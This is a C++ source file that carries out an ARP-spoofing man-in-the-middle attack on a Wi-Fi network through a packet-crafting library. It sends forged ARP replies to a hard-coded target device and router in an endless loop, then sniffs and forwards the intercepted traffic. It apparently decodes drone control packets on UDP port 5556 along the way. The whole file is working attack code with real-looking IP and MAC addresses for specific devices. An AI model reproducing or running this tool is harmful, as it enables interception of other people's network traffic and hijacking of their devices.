#include <stdio.h>
#include <pgen.h>
#include <thread>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <netpacket/packet.h>


const char* dev = "wlan1";
const char* myip = "192.168.1.7";

struct host{
	char ip[32];
	char mac[32];
};


/* nad11 mobile router */
struct host router = {"192.168.1.1", "90:03:b7:90:e1:62"};

/* iphone */
//struct host target = {"192.168.1.4", "f0:24:75:bf:8d:bf"};

/* mac wlan en0 */
//struct host target = {"192.168.222.106", "10.128.5.85"};
struct host target = {"192.168.179.4", "80:e6:50:17:18:46"};



pgen_t* handle;
void mitm_attack(const char* ip1, const char* mac1, 
					const char* ip2, const char* mac2);
bool other_packet_filter(const u_char* packet, int len);


void filter(const u_char* packet, int len){
	pgen_unknown buf(packet, len);
	if(buf.isUDP && buf.portis(5556)){
		pgen_ardrone pack(packet, len);
		pack.DSUMMARY();
	}
}




bool myswitch(const u_char* packet, int len){
	
	// slankdev.net 

	if(other_packet_filter(packet, len) == false) return true;

	macaddr next_src;
	macaddr next_dst;
	next_src.setmacbydev(dev);
	pgen_ip ip(packet, len);
	
	if(ip.IP.dst == target.ip)	next_dst = target.mac;
	else						next_dst = router.mac;
	ip.ETH.src = next_src;
	ip.ETH.dst = next_dst;
	
	filter(packet, len);

	ip.send_handle(handle);
	return true;
}





int main(int argc, char** argv){
	handle = pgen_open(dev, NULL);
	if(handle == NULL){
		perror("pgen_open");
		return -1;
	}
	std::thread mitm(mitm_attack, target.ip, target.mac, router.ip, router.mac);
	sniff(handle, myswitch);
}



bool other_packet_filter(const u_char* packet, int len){
	ipaddr myip;
	myip.setipbydev(dev);

	pgen_unknown buf(packet, len);
	if(buf.isIP == false)	return false;
	if(buf.ipaddris(myip)) return false;

	return true;	
}



void mitm_attack(const char* ip1, const char* mac1, 
					const char* ip2, const char* mac2){
	pgen_arp pack_to_target1;
	pgen_arp pack_to_target2;

	pack_to_target1.ETH.src.setmacbydev(dev);
	pack_to_target1.ETH.dst = mac1;
	pack_to_target1.ARP.srcEth.setmacbydev(dev);
	pack_to_target1.ARP.srcIp  = ip2;
	pack_to_target1.ARP.dstEth = mac1;
	pack_to_target1.ARP.dstIp  = ip1;
	pack_to_target1.ARP.operation = 2;
	pack_to_target2.ETH.src.setmacbydev(dev);
	pack_to_target2.ETH.dst = mac2;
	pack_to_target2.ARP.srcEth.setmacbydev(dev);
	pack_to_target2.ARP.srcIp  = ip1;
	pack_to_target2.ARP.dstEth = mac2;
	pack_to_target2.ARP.dstIp  = ip2;
	pack_to_target2.ARP.operation = 2;

	for(int i=0; ; i++){
		pack_to_target1.send(dev);
		pack_to_target2.send(dev);
		sleep(1);
	}		
}
